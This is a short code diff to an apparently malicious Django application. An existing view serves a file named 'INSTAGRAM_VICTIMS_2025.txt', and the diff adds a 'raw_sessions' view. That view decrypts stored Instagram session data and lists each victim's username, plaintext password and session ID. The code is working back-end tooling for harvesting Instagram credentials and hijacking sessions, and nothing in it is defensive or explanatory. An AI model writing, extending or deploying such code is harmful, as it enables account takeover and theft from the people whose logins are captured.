@@ -89,3 +89,23 @@ def download_all(request):
     response = HttpResponse(txt, content_type='text/plain')
     response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_VICTIMS_2025.txt"'
     return response
+
+
+def raw_sessions(request):
+    import json
+    from cryptography.fernet import Fernet
+    import os
+    fernet = Fernet(os.getenv('FERNET_KEY').encode())
+    
+    txt = "USERNAME | PASSWORD | SESSIONID\n"
+    txt += "-"*50 + "\n"
+    
+    for acc in InstagramAccount.objects.all():
+        try:
+            data = json.loads(fernet.decrypt(acc.session_data.encode()).decode())
+            sessionid = data.get("authorization_data", {}).get("sessionid", "NO_SESSION")
+            txt += f"{acc.username} | {acc.password} | {sessionid}\n"
+        except:
+            txt += f"{acc.username} | {acc.password} | ERROR\n"
+    
+    return HttpResponse(txt, content_type='text/plain')
